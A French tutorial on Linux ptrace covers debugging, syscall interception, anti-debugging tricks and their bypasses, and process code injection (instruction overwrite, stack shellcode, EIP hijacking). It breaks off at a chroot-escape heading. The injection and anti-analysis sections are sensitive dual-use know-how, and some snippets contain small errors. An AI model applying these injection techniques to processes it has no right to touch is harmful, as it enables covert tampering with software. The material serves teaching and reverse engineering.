# Process Trace

## <mark style="color:red;">Ptrace (Process Trace)</mark>

### <mark style="color:blue;">Introduction</mark>

Linux fournit ptrace comme un outil de traçage de processus, qui peut intercepter les appels système à leurs points d'entrée et de sortie, effectués par un autre processus.

ptrace fournit un mécanisme par lequel un processus parent peut observer et contrôler l'exécution d'un autre processus. Il peut examiner et modifier l'image mémoire centrale et les registres d'un processus enfant, et est principalement utilisé pour implémenter le débogage par points d'arrêt et le traçage d'appels système.

### <mark style="color:blue;">Syntaxe de ptrace</mark>

ptrace prend les arguments suivants :

{% code fullWidth="true" %}
```c
long ptrace(enum __ptrace_request request,
            pid_t pid,
            void *addr,
            void *data);
```
{% endcode %}

Où :

* **request** = type de comportement de ptrace. Par exemple, nous pouvons nous attacher ou nous détacher d'un processus, lire/écrire des registres, lire/écrire le segment de code et le segment de données.
* **pid** = identifiant du processus tracé
* **addr** = adresse
* **data** = données

<figure><img src="../../.gitbook/assets/Screenshot From 2025-09-07 18-42-00.png" alt=""><figcaption></figcaption></figure>

***

### <mark style="color:blue;">Deux méthodes pour tracer un processus</mark>

#### <mark style="color:green;">1. Méthode par processus enfant</mark>

L'application tracée peut être exécutée comme un enfant, en exécutant fork() dans le processus parent, ou l'application traceur.&#x20;

Dans ce cas, l'application tracée doit appeler ptrace avec les paramètres suivants :

```c
ptrace(PTRACE_TRACEME, 0, NULL, NULL);
```

**Important :** Cela signifie que nous devons modifier le code source de l'application tracée pour ajouter cette ligne de code.

#### <mark style="color:green;">2. Méthode par attachement</mark>

Si une application est déjà en cours d'exécution et que nous voulons la tracer, alors l'application traceur peut utiliser le format suivant de ptrace :

```c
ptrace(PTRACE_ATTACH, pid_of_traced_process, NULL, NULL);
```

Dans ce cas, l'application tracée n'a pas besoin d'ajouter de code. Dans les deux cas, tout ce dont nous avons besoin est l'identifiant du processus ou pid pour tracer une application.

Le pid d'un processus en cours d'exécution est obtenu en exécutant la commande `ps` sous Linux. Une fois tracée, l'application tracée devient un processus enfant de l'application traceur.

***

### <mark style="color:blue;">Fonctionnement du traçage</mark>

Une fois qu'un processus est tracé, chaque fois que le processus tracé exécute un appel système ou revient d'un appel système, le contrôle d'exécution est transféré à l'application traceur.

Alors l'application traceur peut vérifier les arguments de l'appel système ou faire d'autres choses, telles que regarder dans les registres, modifier les valeurs des registres, injecter du code dans le segment de code.

De plus, les valeurs retournées par l'appel système peuvent être accessibles et modifiées de manière similaire. Une fois que l'application traceur a fini d'examiner l'appel système, l'application tracée peut continuer avec l'appel système.

***

### <mark style="color:blue;">Exemple pratique</mark>

Cette section démontre l'idée de ptrace avec quelques exemples. De l'aide sur l'utilisation de ptrace peut être trouvée sur les sites web suivants :

* http://www.linuxjournal.com/article/6100
* http://www.linuxjournal.com/node/6210/print

#### <mark style="color:green;">Description de l'exemple</mark>

Pour démontrer l'utilisation de ptrace, j'ai écrit une petite application serveur et client. L'application cliente se connecte au serveur en ouvrant un socket TCP. Ensuite, le client demande à l'utilisateur une chaîne d'entrée à envoyer, qui est plus tard transmise à l'application serveur.

Dans cet exemple, l'application serveur est exécutée sur l'hôte zelda4 et le client est exécuté sur l'hôte zelda1.

#### <mark style="color:green;">Exécution du serveur</mark>

```bash
[amb6fp@zelda4 tracer]$ ./server 5001
#CC algorithm: bic
Here is the message: Hello World
```

#### <mark style="color:green;">Exécution du client</mark>

```bash
[amb6fp@zelda1 tracer]$ ./client 198.124.42.17 5001
CLIENT: socket fd: 3
CLIENT: buffer size: 8192000
CLIENT: #CC algorithm: bic
CLIENT: Please enter the message: Hello World
CLIENT: I got your message
```

Une fois que le client se connecte au serveur, il affiche quelques informations de base du socket.&#x20;

Par exemple

* Il affiche la taille du buffer et l'algorithme de contrôle de congestion utilisé pour cette connexion.
* Ensuite, le client demande le message à l'utilisateur, qui est plus tard transmis au serveur et affiché.

**Note :** Pour distinguer entre les sorties affichées par le client et l'application ptrace (intercepteur), qui est expliquée plus tard, les commandes d'affichage exécutées par le client commencent par `CLIENT:`. De même, les sorties de l'application intercepteur commencent par `INTERCEPTOR:`.

***

#### <mark style="color:green;">Exemple avec l'intercepteur</mark>

L'exemple suivant montre la sortie lorsque l'application cliente est tracée par l'intercepteur :

```bash
[amb6fp@zelda1]$ ./interceptor ./client 198.124.42.17 5001
Number of input 4
INTERCEPTOR: This is a SOCKET call
INTERCEPTOR: Family:2 Type:1 Protocol:0
CLIENT: socket fd: 3
CLIENT: buffer size: 8192000
INTERCEPTOR: This is a CONNECT call
INTERCEPTOR: IP: 198.124.42.17, Port: 5001, Family: 2
CLIENT: #CC algorithm: bic
CLIENT: Please enter the message: Hello World
CLIENT: I got your message
INTERCEPTOR: Exited
```

Dans cet exemple, l'application cliente est passée comme argument (avec les propres arguments du client) à l'application intercepteur. Comme affiché, l'application intercepteur trace l'application cliente et piège l'appel système socket. Elle piège aussi l'appel système connect, et affiche l'adresse IP de destination et le numéro de port, qui ont été passés comme arguments à l'appel connect.

***

### <mark style="color:blue;">Code de l'intercepteur</mark>

Le segment de code suivant de l'application intercepteur décrit l'idée sur comment tracer une application :

{% code fullWidth="true" %}
```c
char *cmd[10];
for(i = 0; i < argc-1; i++){
    cmd[i] = argv[i+1];
}
cmd[i] = (char *)0;

pid_t processid = fork();
if(processid == 0){
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    execvp(argv[1], cmd);
}
```
{% endcode %}

#### <mark style="color:green;">Explication du code</mark>

1. **Préparation des arguments :** D'abord, les arguments passés à l'intercepteur sont copiés dans un tableau.
2. **Création du processus enfant :** Ensuite, un processus enfant est créé en exécutant la commande fork. À ce point, le processus enfant est juste une image du processus parent (intercepteur), mais il ne fait rien de significatif.
3. **Activation du traçage :** Avant d'exécuter réellement l'application cliente (qui est passée dans la liste de commandes), le traçage du processus enfant est démarré en appelant la fonction ptrace. Par conséquent, l'intercepteur piègera chaque appel système dès le début qui sera fait par ce processus enfant.
4. **Exécution de l'application :** Une fois que le traçage est démarré, l'application cliente est exécutée par la commande execvp.

***

### <mark style="color:blue;">Boucle de traçage</mark>

L'application intercepteur entre ensuite dans une boucle et attend tout appel système qui sera fait par l'application cliente. Une fois qu'un appel système est piégé, en utilisant l'appel de fonction ptrace avec les arguments appropriés, les paramètres passés à cet appel système peuvent être visualisés et aussi être modifiés.

### <mark style="color:blue;">Application pratique : Configuration de circuit</mark>

L'application intercepteur peut aussi être utilisée si une décision de configuration de circuit doit être prise. Si l'adresse IP de destination qui a été passée à l'appel système connect correspond à l'adresse IP désirée, avant de laisser l'appel connect continuer, une procédure de configuration de circuit peut être exécutée.

Une fois que le circuit est configuré, l'application tracée continue avec l'appel connect et transmet les données sur le circuit. Le code source attaché contient quelques exemples de codes qui expliquent cette idée.

### <mark style="color:blue;">Résumé</mark>

ptrace est un outil puissant sous Linux pour :

* **Déboguer des applications** en plaçant des points d'arrêt
* **Tracer les appels système** pour analyser le comportement d'un programme
* **Modifier dynamiquement** le comportement d'un processus
* **Implémenter des mécanismes de sécurité** et de surveillance
* **Créer des outils d'analyse** et de profilage

Cette technique est largement utilisée dans les débogueurs comme GDB, les outils de profilage, et les systèmes de surveillance de sécurité.

***

## <mark style="color:red;">Comprendre ptrace : L'histoire complète du parent, enfant et fork</mark>

### <mark style="color:blue;">1. Les concepts de base</mark>

#### <mark style="color:green;">Qu'est-ce qu'un processus ?</mark>

* Un **processus** = un programme qui s'exécute en mémoire
* Chaque processus a un **PID** (Process ID) unique
* Un processus peut créer d'autres processus

#### <mark style="color:green;">La relation parent-enfant</mark>

```
Processus Parent (PID: 1234)
    |
    └── Processus Enfant (PID: 5678)
```

### <mark style="color:blue;">2. La fonction fork() - Comment créer un enfant</mark>

#### <mark style="color:green;">Avant fork() :</mark>

```
[Processus A] - PID: 1234
```

#### <mark style="color:green;">Après fork() :</mark>

```
[Processus A - Parent] - PID: 1234
    |
    └── [Processus A - Enfant] - PID: 5678
```

#### <mark style="color:green;">Code exemple de fork :</mark>

```c
pid_t processid = fork();

if (processid == 0) {
    // JE SUIS L'ENFANT !
    printf("Je suis l'enfant, mon PID = %d\n", getpid());
} else {
    // JE SUIS LE PARENT !
    printf("Je suis le parent, PID enfant = %d\n", processid);
}
```

***

### <mark style="color:blue;">3. L'histoire complète avec ptrace</mark>

#### <mark style="color:green;">Scénario : On veut tracer le programme "client"</mark>

**Étape 1 : Lancement de l'intercepteur**

```bash
./interceptor ./client 198.124.42.17 5001
```

**Étape 2 : L'intercepteur se prépare**

```c
// L'intercepteur récupère les arguments pour le client
char *cmd[10];
cmd[0] = "./client";           // Le programme à exécuter
cmd[1] = "198.124.42.17";      // IP du serveur
cmd[2] = "5001";               // Port du serveur
cmd[3] = NULL;                 // Fin de la liste
```

**Étape 3 : Fork - La division !**

```c
pid_t processid = fork();
```

**BOOM !** À ce moment, il y a maintenant **2 processus identiques** :

```
[Intercepteur Parent]           [Intercepteur Enfant]
PID: 1234                      PID: 5678
processid = 5678               processid = 0
```

**Étape 4 : L'enfant devient le client**

```c
if (processid == 0) {
    // L'ENFANT exécute ce code
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);  // "Papa, surveille-moi !"
    execvp("./client", cmd);                // Je deviens le programme client
}
```

**Que se passe-t-il ?**

1. L'enfant dit : "Papa, je veux que tu me surveilles avec PTRACE\_TRACEME"
2. L'enfant se transforme en programme "client" avec execvp()

**Étape 5 : Le parent devient le surveillant**

```c
// Le PARENT exécute ce code (processid != 0)
while (1) {
    wait(&status);  // J'attends que mon enfant fasse quelque chose
    
    if (/* enfant a fait un appel système */) {
        // J'examine ce qu'il a fait
        printf("INTERCEPTOR: Mon enfant a appelé socket!\n");
        
        // Je le laisse continuer
        ptrace(PTRACE_CONT, processid, NULL, NULL);
    }
}
```

***

### <mark style="color:blue;">4. La communication parent-enfant avec ptrace</mark>

#### Quand l'enfant fait un appel système :

```
[Enfant = client]               [Parent = intercepteur]
    |                              |
    | socket() -----------------> | STOP ! Examine l'appel
    | (ARRÊTÉ)                     | ptrace lit les paramètres
    |                              | printf("INTERCEPTOR: socket!")
    | <------------------ CONT --- | ptrace(PTRACE_CONT, ...)
    | (CONTINUE)                   |
    | connect() ----------------> | STOP ! Examine connect
    | (ARRÊTÉ)                     | ptrace lit IP et port
    |                              | printf("IP: 198.124.42.17")
    | <------------------ CONT --- | Laisse continuer
```

### <mark style="color:blue;">5. Exemple concret - Déroulement complet</mark>

#### Code de l'intercepteur simplifié :

```c
int main(int argc, char *argv[]) {
    // 1. Préparer les arguments pour le client
    char *cmd[10];
    for(int i = 0; i < argc-1; i++){
        cmd[i] = argv[i+1];  // "./client", "IP", "port"
    }
    cmd[argc-1] = NULL;
    
    // 2. Créer l'enfant
    pid_t enfant_pid = fork();
    
    if (enfant_pid == 0) {
        // === CODE DE L'ENFANT ===
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);  // "Papa, surveille-moi"
        execvp(argv[1], cmd);                   // Je deviens "client"
        
    } else {
        // === CODE DU PARENT ===
        int status;
        
        while (1) {
            wait(&status);  // Attendre que l'enfant s'arrête
            
            if (WIFSTOPPED(status)) {
                // L'enfant s'est arrêté sur un appel système
                
                // Lire quel appel système c'était
                long syscall = ptrace(PTRACE_PEEKUSER, enfant_pid, 
                                    4 * ORIG_EAX, NULL);
                
                if (syscall == SYS_socket) {
                    printf("INTERCEPTOR: This is a SOCKET call\n");
                    // Lire les paramètres du socket...
                }
                
                if (syscall == SYS_connect) {
                    printf("INTERCEPTOR: This is a CONNECT call\n");
                    // Lire IP et port...
                }
                
                // Laisser l'enfant continuer
                ptrace(PTRACE_CONT, enfant_pid, NULL, NULL);
            }
            
            if (WIFEXITED(status)) {
                printf("INTERCEPTOR: Exited\n");
                break;  // L'enfant a terminé
            }
        }
    }
}
```

### <mark style="color:blue;">6. Timeline complète d'exécution</mark>

```
Temps   Parent (intercepteur)           Enfant (client)
-----   ---------------------           ---------------
T0      ./interceptor lance             n'existe pas
T1      fork() créé l'enfant           fork() retourne 0
T2      processid = 5678               processid = 0
T3      va dans else                   va dans if
T4      wait() - attend               ptrace(TRACEME) - "surveille-moi"
T5      wait() - attend               execvp() - devient "client"
T6      wait() - attend               client fait socket()
T7      reçoit STOP signal            [ARRÊTÉ sur socket()]
T8      "SOCKET call detected"        [EN ATTENTE]
T9      ptrace(CONT) - continue       [REPREND]
T10     wait() - attend               client fait connect()
T11     reçoit STOP signal            [ARRÊTÉ sur connect()]
T12     "CONNECT call detected"       [EN ATTENTE]
T13     ptrace(CONT) - continue       [REPREND]
...     ...                           client continue normalement
TN      enfant terminé - break        exit()
```

***

## <mark style="color:red;">Playing with ptrace() for fun and profit - Explications complète</mark>

### <mark style="color:blue;">Introduction : "Il était une fois..."</mark>

#### <mark style="color:green;">Qu'est-ce que ptrace() ?</mark>

Sous UNIX, **ptrace() est LE SEUL moyen officiel** de faire du débogage. Voici pourquoi c'est important :

* **User-space** : Fonctionne depuis l'espace utilisateur (pas besoin de modules kernel)
* **Interface rigide** : API simple mais puissante
* **Pas de root nécessaire** : Un utilisateur peut déboguer ses propres processus
* **Élégant** : Une seule fonction pour tout contrôler

> _"ptrace() est unique et mystérieux"_ - Page de manuel SunOS

***

### <mark style="color:blue;">1. La fonction ptrace() en détail</mark>

#### <mark style="color:green;">Prototype complet</mark>

```c
#include <sys/ptrace.h>
long ptrace(enum ptrace_request request, pid_t pid, void *addr, void *data);
```

#### <mark style="color:green;">Les 3 modes de traçage</mark>

**1. Mode pas à pas (Single-step)**

* Le processus s'arrête après **chaque instruction**
* Utilisé par les débogueurs pour "step into"

```c
// Exemple : exécuter une seule instruction
ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL);
wait(&status);  // Le processus s'arrête après 1 instruction
```

**2. Par appel système (Syscall tracing)**

* Le processus s'arrête à **chaque appel système**
* Utilisé par `strace`

```c
// Exemple : tracer tous les appels système
ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
wait(&status);  // S'arrête à l'entrée ET la sortie de chaque syscall
```

**3. Traçage passif (Breakpoint tracing)**

* Le processus s'arrête seulement aux **points d'arrêt**
* Utilisé par GDB avec les breakpoints

***

### <mark style="color:blue;">2. Actions classiques documentées</mark>

#### Tableau des principales requêtes

| Requête           | Rôle                    | Exemple d'usage                    |
| ----------------- | ----------------------- | ---------------------------------- |
| `PTRACE_TRACEME`  | "Je veux être tracé"    | L'enfant demande à être surveillé  |
| `PTRACE_ATTACH`   | "Je trace ce processus" | S'attacher à un processus existant |
| `PTRACE_DETACH`   | "J'arrête de tracer"    | Se détacher proprement             |
| `PTRACE_PEEKTEXT` | Lire code               | Lire les instructions du programme |
| `PTRACE_PEEKDATA` | Lire données            | Lire les variables, heap, stack    |
| `PTRACE_PEEKUSER` | Lire registres          | Lire EAX, EBX, etc.                |
| `PTRACE_POKETEXT` | Écrire code             | Modifier les instructions !        |
| `PTRACE_POKEDATA` | Écrire données          | Modifier les variables             |
| `PTRACE_POKEUSR`  | Écrire registres        | Changer EAX, EIP, etc.             |
| `PTRACE_GETREGS`  | Lire tous registres     | Dump complet des registres         |
| `PTRACE_SETREGS`  | Écrire tous registres   | Restaurer l'état complet           |

#### <mark style="color:green;">Exemples pratiques</mark>

**Lire une instruction :**

```c
// Lire l'instruction à l'adresse 0x12345678
long instruction = ptrace(PTRACE_PEEKTEXT, pid, (void*)0x12345678, NULL);
printf("Instruction: 0x%lx\n", instruction);
```

**Modifier une variable :**

```c
// Changer la valeur à l'adresse 0x7fff1234
long nouvelle_valeur = 42;
ptrace(PTRACE_POKEDATA, pid, (void*)0x7fff1234, (void*)nouvelle_valeur);
```

**Lire tous les registres :**

```c
struct user_regs_struct regs;
ptrace(PTRACE_GETREGS, pid, NULL, &regs);
printf("EAX = %ld, EBX = %ld\n", regs.eax, regs.ebx);
```

***

### <mark style="color:blue;">3. Gestion des signaux avec ptrace</mark>

#### <mark style="color:green;">Le problème fondamental</mark>

Quand un processus tracé reçoit **N'IMPORTE QUEL signal**, il s'arrête et le traceur est notifié. Mais le traceur ne sait pas quel signal c'était !

```c
// Le processus tracé reçoit SIGUSR1
// Le traceur reçoit seulement :
wait(&status);  // status indique "arrêté par signal"
// Mais lequel ?
```

#### <mark style="color:green;">La solution : PTRACE\_GETSIGINFO</mark>

```c
siginfo_t siginfo;
ptrace(PTRACE_GETSIGINFO, pid, NULL, &siginfo);

printf("Signal reçu: %d\n", siginfo.si_signo);  // SIGUSR1, SIGTRAP, etc.
printf("Code: %d\n", siginfo.si_code);          // Origine du signal
```

#### <mark style="color:green;">Structure siginfo\_t expliquée</mark>

```c
typedef struct siginfo {
    int si_signo;  // Numéro du signal (SIGTRAP = 5, SIGUSR1 = 10, etc.)
    int si_errno;  // Code d'erreur associé
    int si_code;   // CRUCIAL : Qui a envoyé le signal ?
                   // SI_USER = envoyé par un autre processus
                   // SI_KERNEL = envoyé par le noyau
                   // SI_TKILL = envoyé par kill()/tkill()
    // ... autres champs ...
} siginfo_t;
```

***

### <mark style="color:blue;">4. Protection anti-ptrace() - Explications complètes</mark>

#### <mark style="color:green;">Le code mystérieux expliqué</mark>

```c
int stayalive;  // Variable de contrôle

void trapcatch(int i) {
    stayalive = 1;  // "J'ai reçu mon signal !"
}

int main(void) {
    stayalive = 1;
    signal(SIGTRAP, trapcatch);  // Installer le gestionnaire
    
    while(stayalive) {
        stayalive = 0;              // "Je vais mourir..."
        kill(getpid(), SIGTRAP);    // "...à moins que je reçoive ça"
        
        // Si j'arrive ici avec stayalive=1, pas de débogueur
        if (stayalive) {
            do_the_work();  // Code secret
        }
        // Sinon, la boucle s'arrête (protection activée)
    }
}
```

#### Pourquoi ça marche ?

**Sans débogueur :**

```
1. kill(getpid(), SIGTRAP)     → Signal envoyé
2. Noyau appelle trapcatch()   → stayalive = 1
3. Boucle continue             → Code secret exécuté
```

**Avec débogueur :**

```
1. kill(getpid(), SIGTRAP)     → Signal envoyé
2. DÉBOGUEUR intercepte        → trapcatch() JAMAIS appelée
3. stayalive reste 0           → Boucle s'arrête
```

#### L'astuce cachée

> _"Protection basée sur le fait qu'un débogueur classique ne peut pas différencier les signaux envoyés par le noyau ou par l'utilisateur"_

**Problème des débogueurs classiques :** Ils interceptent TOUS les SIGTRAP sans distinction !

***

### <mark style="color:blue;">5. Anti-anti-ptrace() - Contournement</mark>

#### Le problème du contournement

Comment un débogueur avancé peut-il différencier :

* Un SIGTRAP "normal" (breakpoint du débogueur)
* Un SIGTRAP "test" (protection anti-ptrace)

#### Solution 1 : Méthode manuelle (fastidieuse)

```c
// Vérifier si c'est du pas-à-pas
if (registre_eflags & TRAP_FLAG) {
    // C'est du single-step
}

// Vérifier les points d'arrêt matériels
if (registre_dr0 || registre_dr1 || registre_dr2 || registre_dr3) {
    // C'est un hardware breakpoint
}

// Vérifier si on est dans un appel système
if (dans_syscall) {
    // C'est un syscall trap
}
```

**Problèmes :** Complexe, non-portable, fastidieux

#### Solution 2 : PTRACE\_GETSIGINFO (élégante)

```c
siginfo_t sig;
ptrace(PTRACE_GETSIGINFO, pid, NULL, &sig);

if (sig.si_code == SI_USER) {
    // Signal envoyé par le processus lui-même (kill())
    // → C'est de la protection anti-ptrace !
    // → Laisser passer le signal au programme
    ptrace(PTRACE_CONT, pid, NULL, SIGTRAP);
} else {
    // Signal du débogueur ou du noyau
    // → Arrêter pour l'utilisateur
    printf("Breakpoint atteint\n");
}
```

**Avantage :** Portable, élégant, classe ! 😎

***

### <mark style="color:blue;">6. Problème des fork() - Traçage des enfants</mark>

Solution basique :&#x20;

* A l’appel `a` fork(), on surveille le code de retour,&#x20;
* ⇒ on r´ecup`ere ainsi le PID du fils 2 On s’attache au nouveau processus`
* &#x20;`On se met` a le tracer ;

#### <mark style="color:green;">Le problème de la race condition</mark>

```c
// Processus tracé fait :
pid_t child = fork();

if (child == 0) {
    // ENFANT : peut s'exécuter avant que le traceur s'attache !
    execv("/bin/secret_program", args);  // ÉCHAPPE au traçage !
}
```

#### Solution basique (défaillante)

```c
// Dans le traceur :
wait(&status);  // Le parent fait fork()
if (syscall_num == SYS_fork) {
    pid_t child_pid = /* récupérer PID enfant */;
    ptrace(PTRACE_ATTACH, child_pid, NULL, NULL);  // TROP TARD !
}
```

**Problème :** Le scheduler peut donner la main à l'enfant avant l'attachement !

#### Solution correcte : PTRACE\_O\_TRACEFORK

Les options PTRACE\_O\_TRACEFORK & Co servent `a r´egler ce probl`eme :

* &#x20;Attachement automatique au fils, Le noyau met le fils en ´etat STOPPED avant mˆeme qu’il soit declare RUNNABLE.

```c
// Configurer le traçage automatique des enfants
ptrace(PTRACE_SETOPTIONS, pid, NULL, 
       PTRACE_O_TRACEFORK | PTRACE_O_TRACEVFORK | PTRACE_O_TRACECLONE);

// Maintenant, TOUS les enfants sont automatiquement :
// 1. Mis en état STOPPED avant d'être RUNNABLE
// 2. Attachés au même traceur que le parent
```

#### Options disponibles

| Option                  | Rôle                                   |
| ----------------------- | -------------------------------------- |
| `PTRACE_O_TRACEFORK`    | Tracer les fork()                      |
| `PTRACE_O_TRACEVFORK`   | Tracer les vfork()                     |
| `PTRACE_O_TRACECLONE`   | Tracer les clone() (threads)           |
| `PTRACE_O_TRACEEXEC`    | Tracer les execve()                    |
| `PTRACE_O_TRACEEXIT`    | Tracer les exit()                      |
| `PTRACE_O_TRACESYSGOOD` | Distinguer syscalls des autres signaux |

***

### <mark style="color:blue;">7. Accès à l'espace d'adressage</mark>

#### <mark style="color:green;">Lecture d'un mot mémoire (attention aux erreurs)</mark>

```c
// MAUVAISE façon :
long ret = ptrace(PTRACE_PEEKTEXT, pid, target_addr, NULL);
if (ret == -1) {  // FAUX ! -1 peut être une valeur légale !
    perror("Erreur");
}

// BONNE façon :
errno = 0;
long ret = ptrace(PTRACE_PEEKTEXT, pid, target_addr, NULL);
if (errno != 0 && ret == -1) {
    perror("ptrace_peektext()");
    return 1;
}
```

#### <mark style="color:green;">Lecture de plusieurs octets (plus efficace)</mark>

```c
// Au lieu de faire plein de PTRACE_PEEKTEXT
char buf[BUFMAX];
char filename[64];
snprintf(filename, sizeof(filename), "/proc/%d/mem", pid);

int fd = open(filename, O_RDONLY);
if (fd != -1) {
    pread(fd, buf, BUFMAX, offset);  // Lecture directe !
    close(fd);
}
```

**Avantage :** Plus rapide que de multiples appels ptrace()

***

## <mark style="color:red;">Injection de code avec ptrace()</mark>&#x20;

### Objectifs de l'injection de code

#### Les trois piliers

1. **Discrétion** : Ne pas être détectée
2. **Stabilité** : Ne pas crasher le programme
3. **Portabilité** : Marcher sur différents systèmes

***

### Où injecter les instructions ?

#### Les candidats possibles

**1. La pile (stack)**

✅ **Avantages :** Toujours disponible, facile d'accès ❌ **Inconvénients :** Doit être exécutable (NX bit)

**2. Padding des sections ELF**

✅ **Avantages :** Zones "vides" dans le binaire ❌ **Inconvénients :** Taille limitée

**3. N'importe où dans le code**

✅ **Avantages :** Flexible, toujours exécutable ❌ **Inconvénients :** Risque de corrompre le programme

***

### Technique 1 : Injection "n'importe où"

#### Principe : Remplacer temporairement des instructions

```c
// Étapes de l'injection directe :
// 1. Sauvegarder les octets pointés par EIP
long original_bytes = ptrace(PTRACE_PEEKTEXT, pid, (void*)eip, NULL);

// 2. Écraser par nos instructions
long shellcode = 0x...;  // Notre code malicieux
ptrace(PTRACE_POKETEXT, pid, (void*)eip, (void*)shellcode);

// 3. Redémarrer le processus
ptrace(PTRACE_CONT, pid, NULL, NULL);
wait(&status);  // Attendre l'arrêt

// 4. Restaurer les anciennes instructions
ptrace(PTRACE_POKETEXT, pid, (void*)eip, (void*)original_bytes);
```

#### Comment réveiller le traceur ?

```c
// Dans le shellcode injecté :
kill(SIGTRAP, getpid());  // "Papa, réveille toi !"
```

Cette instruction force le processus à s'arrêter et redonne le contrôle au traceur.

***

### Technique 2 : Injection dans la pile

#### Avant l'injection

```
┌─────────────┐
│   Stack     │
├─────────────┤
│ mov ebx, 1  │ ← EIP pointe ici
│ add eax, 4  │
│ cmp eax, 42 │
└─────────────┘
     ESP
```

#### Après injection

```
┌─────────────┐
│   Stack     │
├─────────────┤
│ Code injecté│ ← EIP pointe ici maintenant
│    ret      │
│  (vide)     │
├─────────────┤
│ mov ebx, 1  │ ← Ancienne EIP sauvée
│ add eax, 4  │
│ cmp eax, 42 │
└─────────────┘
```

#### Mécanisme détaillé

1. **EIP est sauvegardée** sur la pile
2. **EIP pointe sur ESP** (haut de la pile)
3. **Le shellcode se termine par un return**
4. **Return recharge l'ancienne EIP** → retour normal

#### Code d'exemple

```c
// 1. Récupérer ESP et EIP
struct user_regs_struct regs;
ptrace(PTRACE_GETREGS, pid, NULL, &regs);
void *stack_ptr = (void*)regs.esp;
void *old_eip = (void*)regs.eip;

// 2. Pousser l'ancienne EIP sur la pile
regs.esp -= 4;  // Déplacer ESP
ptrace(PTRACE_POKEDATA, pid, (void*)regs.esp, old_eip);

// 3. Injecter le shellcode sur la pile
ptrace(PTRACE_POKEDATA, pid, (void*)regs.esp - 4, shellcode);
regs.esp -= 4;

// 4. Faire pointer EIP sur le shellcode
regs.eip = regs.esp;
ptrace(PTRACE_SETREGS, pid, NULL, &regs);
```

#### ⚠️ Précaution importante

**La pile doit être exécutable !** Sinon → Segmentation Fault

```bash
# Vérifier si la pile est exécutable
cat /proc/PID/maps | grep stack
# 7fff12345000-7fff12366000 rwxp ... [stack]  ← 'x' = exécutable
```

***

### <mark style="color:blue;">Problème : Interruption d'appel système</mark>

#### Les types d'appels système

Quand on interrompt un processus, il peut être dans différents états :

**1. Non-interruptibles**

* Le processus DOIT finir son appel
* Exemple : écriture sur disque

**2. Interruptibles**

* Appels système "lents"
* Exemple : `read()` sur un socket

**3. Redémarrable manuellement**

* Code de retour = `EINTR`
* L'application doit gérer l'interruption

**4. Redémarrable automatiquement**

* **LE PLUS PROBLÉMATIQUE !**
* Le noyau redémarre automatiquement l'appel

#### Le problème du redémarrage automatique

```c
// Le processus était en train de faire :
read(fd, buffer, size);

// Quand on injecte du code, le noyau peut :
// 1. Exécuter notre injection
// 2. AUTOMATIQUEMENT relancer read() !!!
// 3. Notre injection interfère avec l'appel système
```

**Solution :** Décrémenter EIP de 2 octets pour "reculer" avant l'instruction `int 0x80`.

* Toujours preceder votre shellcode de deux octets inertes (NOP) et faire pointer eip sur &(shellcode+2)
* Faire les mˆemes verifications que le noyau avant d’injecter. ⇒ V´erifier orig eax et eax.

```c
// Correction manuelle
struct user_regs_struct regs;
ptrace(PTRACE_GETREGS, pid, NULL, &regs);
regs.eip -= 2;  // Reculer avant l'appel système
ptrace(PTRACE_SETREGS, pid, NULL, &regs);
```

***

### Solutions aux problèmes d'appels système

#### Le truand (solution rapide et sale)

```c
// Toujours précéder le shellcode de 2 NOP
char shellcode[] = "\x90\x90"      // NOP NOP
                   "\x31\xc0"      // xor eax, eax
                   "\xb0\x01"      // mov al, 1
                   "\xcd\x80";     // int 0x80

// Faire pointer EIP sur &(shellcode+2)
regs.eip = (long)shellcode_addr + 2;
```

#### La brute (vérifications manuelles)

```c
// Vérifier les mêmes choses que le noyau
if (regs.orig_eax == -1) {
    // Pas dans un appel système
} else {
    // Dans un appel système, corriger EIP
    regs.eip -= 2;
}
```

#### Le bon (la solution élégante) ⭐

**Utiliser `PTRACE_O_TRACESYSGOOD`**

```c
// Configuration au début
ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESYSGOOD);

// Puis pour chaque arrêt :
siginfo_t sig;
ptrace(PTRACE_GETSIGINFO, pid, NULL, &sig);

if (sig.si_code & 0x80) {
    printf("Le processus était dans un appel système\n");
    // Appliquer les corrections nécessaires
} else {
    printf("Arrêt normal, injection sûre\n");
}
```

**Principe :** L'option `TRACESYSGOOD` modifie le `si_code` pour indiquer si l'arrêt vient d'un appel système.

***

### <mark style="color:blue;">Applications pratiques</mark>

#### 1. Technique de l'oracle & Skype

**Principe :** "Jetez une question dans un puits et la réponse est renvoyée"

**Problème concret**

* Skype chiffre ses paquets avec une fonction complexe
* Plutôt que de reverser la fonction, **utilisons-la !**

**Solution avec ptrace()**

```c
// 1. Trouver l'adresse de la fonction de chiffrement
void *encrypt_func = find_skype_encrypt_function();

// 2. Préparer nos données à chiffrer
char *plain_data = "Hello World";
char *encrypted_result = malloc(256);

// 3. Manipuler EIP pour exécuter SEULEMENT la fonction
regs.eip = (long)encrypt_func;
// Configurer les arguments dans les registres...
ptrace(PTRACE_SETREGS, pid, NULL, &regs);

// 4. Exécuter jusqu'au return de la fonction
ptrace(PTRACE_CONT, pid, NULL, NULL);

// 5. Récupérer le résultat chiffré !
ptrace(PTRACE_PEEKDATA, pid, result_addr, encrypted_result);
```

**Résultat :** On a utilisé Skype comme "oracle de chiffrement" ! 🧙‍♂️

***

#### 2. Protection anti-reverse engineering

**Protection niveau 1 : Auto-traçage**

```c
// Un processus ne peut être tracé que par UN SEUL débogueur
if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
    // Déjà tracé → exit !
    printf("Debugger detected!\n");
    exit(1);
}
```

**Réponse des analystes : Émulation**

```c
// Hook ptrace() pour qu'il n'échoue jamais
int ptrace(int request, pid_t pid, void *addr, void *data) {
    return 0;  // Toujours succès !
}
```

**Protection niveau 2 : Traçage mutuel**

```c
// Processus A                    Processus B
pid_t b_pid = fork();            // 
if (b_pid == 0) {               // Je trace A
    // Je trace B                  ptrace(PTRACE_ATTACH, a_pid, 0, 0);
    ptrace(PTRACE_ATTACH, b_pid, 0, 0);
    while(1) {                   while(1) {
        check_b_alive();             check_a_alive();
        kill(b_pid, SIGUSR1);        kill(a_pid, SIGUSR2);
        sleep(1);                    sleep(1);
    }                            }
}
```

**Si l'un des deux meurt → l'autre se suicide !**

***

#### 3. Évasion d'environnement chroot()

